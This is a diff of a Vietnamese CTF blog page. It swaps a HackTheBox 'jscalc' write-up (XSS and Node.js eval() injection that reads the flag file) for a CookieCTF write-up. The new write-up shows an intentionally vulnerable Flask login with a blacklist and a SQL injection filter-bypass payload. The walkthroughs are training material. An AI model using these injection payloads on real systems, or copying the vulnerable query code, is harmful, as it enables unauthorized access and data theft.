@@ -4,49 +4,44 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>Hackthebox - jscalc - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:url" content="https://g03m0n.github.io/posts/hackthebox---jscalc/">
+        <title>CookieCTF - Baby SQLite With Filter - g03m0n</title><meta name="Description" content="g03m0n"><meta property="og:url" content="https://g03m0n.github.io/posts/cookiectf--baby-sqlite-with-filter/">
   <meta property="og:site_name" content="g03m0n">
-  <meta property="og:title" content="Hackthebox - jscalc">
-  <meta property="og:description" content="Description Link challenge tại đâyStep Đây là giao diện chính của challenge:
-Vì chương trình sử dụng hàm eval() để tính toán nên ta có thể tiêm vào một payload XSS:
-100*10-3&#43;340 &#43;&#39;&lt;img src=abc onerror=&#34;alert(123)&#34;&gt;&#39; Kiểm tra source code, đọc file package.json, nhận thấy challenge sử dụng node.js =&gt; Có thể execute JavaScript codeở back-end.
-Chương trình sử dụng API api/calculate. Từ web_jscalc/challenge/routes/computerHelper.js, hàm calculate() trả về kết quả từ hàm eval() và đưa ra một ngoại lệ chỉ khi có lỗi cú pháp.">
+  <meta property="og:title" content="CookieCTF - Baby SQLite With Filter">
+  <meta property="og:description" content="Description Link challenge tại đâyYou cannot create the query because we have blocked the following keywords. Challenge you to bypass it, how to know after each SQL Keyword you will be used what SQL statement. The blacklist sqli_filter = ‘[’, ‘]’, ‘,’, ‘admin’, ‘select’, ‘’’, ‘&#34;’, ‘\t’, ‘\n’, ‘\r’, ‘\x08’, ‘\x09’, ‘\x00’, ‘\x0b’, ‘\x0d’, ’ ‘. The vulnerable parameter is ’level’ in Login function.
+Step Đây là giao diện chính của challenge:">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2023-08-22T08:29:01+08:00">
-    <meta property="article:modified_time" content="2023-08-22T08:29:01+08:00">
-    <meta property="article:tag" content="Htb">
-    <meta property="article:tag" content="Lab">
+    <meta property="article:published_time" content="2024-01-19T21:29:01+08:00">
+    <meta property="article:modified_time" content="2024-01-19T21:29:01+08:00">
     <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Easy_ctf">
     <meta property="og:image" content="https://g03m0n.github.io/logo.png">
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://g03m0n.github.io/logo.png">
-  <meta name="twitter:title" content="Hackthebox - jscalc">
-  <meta name="twitter:description" content="Description Link challenge tại đâyStep Đây là giao diện chính của challenge:
-Vì chương trình sử dụng hàm eval() để tính toán nên ta có thể tiêm vào một payload XSS:
-100*10-3&#43;340 &#43;&#39;&lt;img src=abc onerror=&#34;alert(123)&#34;&gt;&#39; Kiểm tra source code, đọc file package.json, nhận thấy challenge sử dụng node.js =&gt; Có thể execute JavaScript codeở back-end.
-Chương trình sử dụng API api/calculate. Từ web_jscalc/challenge/routes/computerHelper.js, hàm calculate() trả về kết quả từ hàm eval() và đưa ra một ngoại lệ chỉ khi có lỗi cú pháp.">
+  <meta name="twitter:title" content="CookieCTF - Baby SQLite With Filter">
+  <meta name="twitter:description" content="Description Link challenge tại đâyYou cannot create the query because we have blocked the following keywords. Challenge you to bypass it, how to know after each SQL Keyword you will be used what SQL statement. The blacklist sqli_filter = ‘[’, ‘]’, ‘,’, ‘admin’, ‘select’, ‘’’, ‘&#34;’, ‘\t’, ‘\n’, ‘\r’, ‘\x08’, ‘\x09’, ‘\x00’, ‘\x0b’, ‘\x0d’, ’ ‘. The vulnerable parameter is ’level’ in Login function.
+Step Đây là giao diện chính của challenge:">
 <meta name="application-name" content="g03m0n">
 <meta name="apple-mobile-web-app-title" content="g03m0n"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/posts/hackthebox---jscalc/" /><link rel="prev" href="https://g03m0n.github.io/posts/portswigger-xxe/" /><link rel="next" href="https://g03m0n.github.io/posts/hacthebox---proxyasservice/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://g03m0n.github.io/posts/cookiectf--baby-sqlite-with-filter/" /><link rel="prev" href="https://g03m0n.github.io/posts/portswigger-insecure-deserialization/" /><link rel="next" href="https://g03m0n.github.io/posts/cookiectf--baby-crawler/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "Hackthebox - jscalc",
+        "headline": "CookieCTF - Baby SQLite With Filter",
         "inLanguage": "en-us",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/g03m0n.github.io\/posts\/hackthebox---jscalc\/"
+            "@id": "https:\/\/g03m0n.github.io\/posts\/cookiectf--baby-sqlite-with-filter\/"
         },"image": [{
                             "@type": "ImageObject",
                             "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","keywords": "htb, lab, ctf","wordcount":  210 ,
-        "url": "https:\/\/g03m0n.github.io\/posts\/hackthebox---jscalc\/","datePublished": "2023-08-22T08:29:01+08:00","dateModified": "2023-08-22T08:29:01+08:00","publisher": {
+                        }],"genre": "posts","keywords": "ctf, easy_ctf","wordcount":  450 ,
+        "url": "https:\/\/g03m0n.github.io\/posts\/cookiectf--baby-sqlite-with-filter\/","datePublished": "2024-01-19T21:29:01+08:00","dateModified": "2024-01-19T21:29:01+08:00","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
                 "@type": "Person",
@@ -132,11 +127,11 @@ Chương trình sử dụng API api/calculate. Từ web_jscalc/challenge/routes/
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Hackthebox - jscalc</h1><div class="post-meta">
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CookieCTF - Baby SQLite With Filter</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
-</span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Hackthebox</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-08-22">2023-08-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;210 words&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/cookiectf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CookieCTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-19">2024-01-19</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;450 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
@@ -149,126 +144,168 @@ Chương trình sử dụng API api/calculate. Từ web_jscalc/challenge/routes/
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h2 id="description">Description</h2>
-<p>Link challenge tại <a href="https://app.hackthebox.com/challenges/jscalc" target="_blank" rel="noopener noreffer">đây</a>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-sqlite-with-filter" target="_blank" rel="noopener noreffer">đây</a>
 </p>
+<blockquote>
+<p>You cannot create the query because we have blocked the following keywords. Challenge you to bypass it, how to know after each SQL Keyword you will be used what SQL statement. The blacklist sqli_filter = &lsquo;[&rsquo;, &lsquo;]&rsquo;, &lsquo;,&rsquo;, &lsquo;admin&rsquo;, &lsquo;select&rsquo;, &lsquo;&rsquo;&rsquo;, &lsquo;&quot;&rsquo;, &lsquo;\t&rsquo;, &lsquo;\n&rsquo;, &lsquo;\r&rsquo;, &lsquo;\x08&rsquo;, &lsquo;\x09&rsquo;, &lsquo;\x00&rsquo;, &lsquo;\x0b&rsquo;, &lsquo;\x0d&rsquo;, &rsquo; &lsquo;.
+<strong>The vulnerable parameter is &rsquo;level&rsquo; in Login function.</strong></p>
+</blockquote>
 <h2 id="step">Step</h2>
 <p>Đây là giao diện chính của challenge:</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336, https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336 1.5x, https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/15d5aecb-99e1-4c6a-aa48-6318ff48d710"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/15d5aecb-99e1-4c6a-aa48-6318ff48d710, https://github.com/g03m0n/pics/assets/130943529/15d5aecb-99e1-4c6a-aa48-6318ff48d710 1.5x, https://github.com/g03m0n/pics/assets/130943529/15d5aecb-99e1-4c6a-aa48-6318ff48d710 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/0908df69-912e-48ca-8a83-4faf67075336"
+        alt="https://github.com/g03m0n/pics/assets/130943529/15d5aecb-99e1-4c6a-aa48-6318ff48d710"
         title="image" /></p>
-<p>Vì chương trình sử dụng hàm <code>eval()</code> để tính toán nên ta có thể tiêm vào một payload XSS:</p>
-<pre tabindex="0"><code>100*10-3+340 +&#39;&lt;img src=abc onerror=&#34;alert(123)&#34;&gt;&#39;
+<p>Tiến hành đọc source code:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
+import urllib
+import os
+import sqlite3
+
+app = Flask(__name__)
+app.secret_key = os.urandom(32)
+from flask import _app_ctx_stack
+
+DATABASE = &#39;users.db&#39;
+
+def get_db():
+    top = _app_ctx_stack.top
+    if not hasattr(top, &#39;sqlite_db&#39;):
+        top.sqlite_db = sqlite3.connect(DATABASE)
+    return top.sqlite_db
+
+
+FLAG = open(&#39;/flag.txt&#39;, &#39;r&#39;).read()
+
+
+@app.route(&#39;/&#39;)
+def index():
+    return render_template(&#39;index.jinja2&#39;)
+
+
+@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def login():
+    if request.method == &#39;GET&#39;:
+        return render_template(&#39;login.jinja2&#39;)
+
+    uid = request.form.get(&#39;uid&#39;, &#39;&#39;).lower()
+    upw = request.form.get(&#39;upw&#39;, &#39;&#39;).lower()
+    level = request.form.get(&#39;level&#39;, &#39;9&#39;).lower()
+
+    sqli_filter = [&#39;[&#39;, &#39;]&#39;, &#39;,&#39;, &#39;admin&#39;, &#39;select&#39;, &#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;, &#39;\x08&#39;, &#39;\x09&#39;, &#39;\x00&#39;, &#39;\x0b&#39;, &#39;\x0d&#39;, &#39; &#39;]
+    for x in sqli_filter:
+        if uid.find(x) != -1:
+            return &#39;No Hack!&#39;
+        if upw.find(x) != -1:
+            return &#39;No Hack!&#39;
+        if level.find(x) != -1:
+            return &#39;No Hack!&#39;
+
+   
+    with app.app_context():
+        conn = get_db()
+        query = f&#34;SELECT uid FROM users WHERE uid=&#39;{uid}&#39; and upw=&#39;{upw}&#39; and level={level};&#34;
+        try:
+            req = conn.execute(query)
+            result = req.fetchone()
+
+            if result is not None:
+                uid = result[0]
+                if uid == &#39;admin&#39;:
+                    return FLAG
+        except Exception as e:
+            print(e)
+            return &#39;Error!&#39;
+    return &#39;Good!&#39;
+
+
+@app.teardown_appcontext
+def close_connection(exception):
+    top = _app_ctx_stack.top
+    if hasattr(top, &#39;sqlite_db&#39;):
+        top.sqlite_db.close()
+
+
+if __name__ == &#39;__main__&#39;:
+    os.system(&#39;rm -rf %s&#39; % DATABASE)
+    with app.app_context():
+        conn = get_db()
+        conn.execute(&#39;CREATE TABLE users (uid text, upw text, level integer);&#39;)
+        conn.execute(&#34;INSERT INTO users VALUES (&#39;dream&#39;,&#39;cometrue&#39;, 9);&#34;)
+        conn.commit()
+
+    app.run(host=&#39;0.0.0.0&#39;, port=1337)
+</code></pre><p>Có thể thấy được rằng để lấy được flag thì <code>uid</code> phải là <code>admin</code> nhưng ở trong database lại không có user nào là <code>admin</code>.
+Vì vậy ta phải khiến cho chương trình hiện thị ra mỗi một cái bảng với cột uid = <code>admin</code>.</p>
+<p>Thử nghiệm ở trên <a href="https://sqliteonline.com/" target="_blank" rel="noopener noreffer">SQLite Online</a>
+ với câu lệnh như sau:</p>
+<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw= &#39;cometrue&#39; AND level=&#39;9&#39; UNION SELECT &#39;admin&#39; AS uid;
 </code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7, https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7 1.5x, https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/71de3238-fd6c-4fdb-af22-f872c378aaab"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/71de3238-fd6c-4fdb-af22-f872c378aaab, https://github.com/g03m0n/pics/assets/130943529/71de3238-fd6c-4fdb-af22-f872c378aaab 1.5x, https://github.com/g03m0n/pics/assets/130943529/71de3238-fd6c-4fdb-af22-f872c378aaab 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/9ba0e4db-e9a8-4363-97b5-b899ca6697c7"
+        alt="https://github.com/g03m0n/pics/assets/130943529/71de3238-fd6c-4fdb-af22-f872c378aaab"
         title="image" /></p>
-<p>Kiểm tra source code, đọc file <code>package.json</code>, nhận thấy challenge sử dụng <code>node.js</code>
-=&gt; Có thể <a href="https://www.codecademy.com/learn/javascript-back-end-development/modules/introduction-to-node-js/cheatsheet" target="_blank" rel="noopener noreffer">execute JavaScript code</a>
- ở back-end.</p>
+<p>Nhưng ta đã bị filter khá là nhiều ký tự, trong đó có cả <code>SELECT</code> và <code>admin</code>.</p>
+<p>Trong SQLite, theo <a href="http://www.humane-assessment.com/blog/moose-custom-analyses-made-easy/#:~:text=For%20example%2C%20to%20build%20a%20parser%20for%20SQLite%2C%20you%20can%20follow%20the%20official%20abstract%20grammar.%20In%20this%20grammar%2C%20the%20selectCore%20is%20one%20of%20the%20central%20productions%20and%20the%20specification%20looks%20like%3A" target="_blank" rel="noopener noreffer">selectCore</a>
+ ngoài kết hợp toán tử <code>UNION</code> với toán tử <code>SELECT</code> ta còn có thể kết hợp với toán tử <code>VALUES</code>.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47, https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47 1.5x, https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/a66b566d-36ad-4dbe-89a5-be9e69ec96c7"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a66b566d-36ad-4dbe-89a5-be9e69ec96c7, https://github.com/g03m0n/pics/assets/130943529/a66b566d-36ad-4dbe-89a5-be9e69ec96c7 1.5x, https://github.com/g03m0n/pics/assets/130943529/a66b566d-36ad-4dbe-89a5-be9e69ec96c7 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/a9be13d1-4dff-4ea4-af0c-62aef3a35b47"
+        alt="https://github.com/g03m0n/pics/assets/130943529/a66b566d-36ad-4dbe-89a5-be9e69ec96c7"
         title="image" /></p>
-<p>Chương trình sử dụng API <code>api/calculate</code>.
-Từ <code>web_jscalc/challenge/routes/computerHelper.js</code>, hàm <code>calculate()</code> trả về kết quả từ hàm <code>eval()</code> và đưa ra một ngoại lệ chỉ khi có lỗi cú pháp. Do đó nó không kiểm tra các trường hợp ngoại lệ khác.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">---</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span><span style="color:#f92672">.</span><span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">calculate</span>(<span style="color:#a6e22e">formula</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">`(function() { return ${ formula } ;}())`</span>);                                                 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">e</span> <span style="color:#a6e22e">instanceof</span> <span style="color:#a6e22e">SyntaxError</span>) {
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Something went wrong!&#39;</span>;
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span>
-</span></span></code></pre></div><p><code>Node.js</code> có một số mô-đun tích hợp có thể được sử dụng để chèn lệnh: <code>process</code>, <code>fs</code>, <code>readdir()</code>, <code>readFile()</code>,&hellip;</p>
-<p>Tiến hành khai thác:
-Đầu tiên kiểm tra đường dẫn hiện tại bằng query:</p>
-<pre tabindex="0"><code>process.cwd()
+<p>Thử nghiệm:</p>
+<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw=&#39;&#39; AND level=0 UNION VALUES(&#39;admin&#39;);
 </code></pre><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920, https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920 1.5x, https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920 2x"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/46664f9e-25c5-409d-b860-d75e342c1ead"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/46664f9e-25c5-409d-b860-d75e342c1ead, https://github.com/g03m0n/pics/assets/130943529/46664f9e-25c5-409d-b860-d75e342c1ead 1.5x, https://github.com/g03m0n/pics/assets/130943529/46664f9e-25c5-409d-b860-d75e342c1ead 2x"
         data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/fe63d98e-853c-4675-9962-9a83b7407920"
+        alt="https://github.com/g03m0n/pics/assets/130943529/46664f9e-25c5-409d-b860-d75e342c1ead"
         title="image" /></p>
-<p>Kiểm tra các thư mục và file có trong thư mục hiện tại bằng cách sử dụng <code>readdirSync()</code>:</p>
-<pre tabindex="0"><code>require(&#39;fs&#39;).readdirSync(&#39;/app&#39;).toString()
-</code></pre><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a, https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a 1.5x, https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a 2x"
-        data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/a7fe7b39-fcc5-4110-a33e-faf75e4e6f7a"
-        title="image" /></p>
-<p>Thêm dấu <code>..</code> vào trước đường dẫn để kiểm tra tại thư mục <code>/</code>:</p>
-<pre tabindex="0"><code>require(&#39;fs&#39;).readdirSync(&#39;../&#39;).toString()
-</code></pre><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92, https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92 1.5x, https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92 2x"
-        data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/6e901104-8ace-4c19-882f-a6b623f6ef92"
-        title="image" /></p>
-<p>Sử dụng <code>readFileSync()</code> để đọc file <code>flag.txt</code>:</p>
-<pre tabindex="0"><code>require(&#39;fs&#39;).readFileSync(&#34;/flax.txt&#34;).toString()
-</code></pre><p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6"
-        data-srcset="https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6, https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6 1.5x, https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6 2x"
-        data-sizes="auto"
-        alt="https://github.com/g03m0n/pics/assets/130943529/d7466910-8d79-4be8-99eb-e406a56164e6"
-        title="image" /></p>
-<p>Flag: <code>HTB{c4lcul4t3d_my_w4y_thr0ugh_rc3}</code></p>
+<p>Và bypass ký tự <code>admin</code> bằng hàm <code>char()</code> có sẵn trong SQLite để ép kiểu về dạng ASCII, dùng <code>||</code> để nối chuỗi và dùng <code>/**/</code> để bypass khoảng trắng.
+Payload:</p>
+<pre tabindex="0"><code>uid=&amp;upw=&amp;level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
+</code></pre><p>Flag: <code>CHH{uS1nG_5yN7@x_d149raM_f95a6d70e2d13245852f2bc2a9ec023a}</code></p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2023-08-22</span>
+                <span>Updated on 2024-01-19</span>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://g03m0n.github.io/posts/hackthebox---jscalc/" data-title="Hackthebox - jscalc" data-hashtags="htb,lab,ctf"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://g03m0n.github.io/posts/hackthebox---jscalc/" data-hashtag="htb"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://g03m0n.github.io/posts/hackthebox---jscalc/" data-title="Hackthebox - jscalc"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://g03m0n.github.io/posts/cookiectf--baby-sqlite-with-filter/" data-title="CookieCTF - Baby SQLite With Filter" data-hashtags="ctf,easy_ctf"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://g03m0n.github.io/posts/cookiectf--baby-sqlite-with-filter/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://g03m0n.github.io/posts/cookiectf--baby-sqlite-with-filter/" data-title="CookieCTF - Baby SQLite With Filter"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/htb/">Htb</a>,&nbsp;<a href="/tags/lab/">Lab</a>,&nbsp;<a href="/tags/ctf/">Ctf</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/ctf/">Ctf</a>,&nbsp;<a href="/tags/easy_ctf/">Easy_ctf</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/posts/portswigger-xxe/" class="prev" rel="prev" title="PortSwigger - XXE"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>PortSwigger - XXE</a>
-            <a href="/posts/hacthebox---proxyasservice/" class="next" rel="next" title="Hackthebox - ProxyAsService">Hackthebox - ProxyAsService<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/posts/portswigger-insecure-deserialization/" class="prev" rel="prev" title="PortSwigger - Insecure Deserialization"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>PortSwigger - Insecure Deserialization</a>
+            <a href="/posts/cookiectf--baby-crawler/" class="next" rel="next" title="CookieCTF - Baby Crawler">CookieCTF - Baby Crawler<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 <div id="comments"><div id="fb-root" class="comment"></div>
             <div
                 class="fb-comments"
-                data-href="https://g03m0n.github.io/posts/hackthebox---jscalc/"
+                data-href="https://g03m0n.github.io/posts/cookiectf--baby-sqlite-with-filter/"
                 data-width="100%"
                 data-numposts="10"
             ></div><noscript>
